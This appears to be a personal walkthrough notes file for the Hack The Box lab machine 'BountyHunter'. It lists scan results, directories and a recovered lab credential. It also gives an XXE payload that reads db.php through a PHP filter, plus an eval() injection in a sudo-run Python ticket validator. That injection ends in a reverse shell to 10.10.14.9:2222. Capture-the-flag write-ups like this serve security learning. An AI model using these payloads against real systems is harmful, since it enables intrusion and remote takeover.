| HOST                            | PORT | PROTO | SERVICE      | VERSION                 |
| ------------------------------- | ---- | ----- | ------------ | ----------------------- |
| 10.10.11.100 (bountyhunter.htb) | 22   | tcp   | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.2 |
| 10.10.11.100 (bountyhunter.htb) | 80   | tcp   | Apache httpd | 2.4.41                  |


## HEADERS
---
HTTP/1.1 200 OK
Date: Sun, 09 Jul 2023 16:43:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

---

## DIRECTORIES
---
* /js  
* /index.php
* /css 
* /db.php
* /assets
* /resources 
* /portal.php
* /server-status

---

## USERS
---
development m19RoAU0hP41A1sTsq6K

---

## NOTES
---
* `/log_submit.php`
* `Disable 'test' account on portal and switch to hashed password. Disable nopass.` in http://bountyhunter.htb/resources/README.txt
* logsubmit vulnerable to XXE
* /etc/passwd works but php files return empty, need a php filter bypass
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```
* reveals development password
* sudo -l `sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py`
* ticket needs to look like this:
```
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**53+410+86**
##Issued: 2021/04/06
#End Ticket
```
to be valid, when the first number is divided by 7 there needs to be a remainder of 4
* the script is vulnerable to `eval()` injection https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/
* `**53+410+86+__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.9/2222 0>&1"')**` reverse shell
---
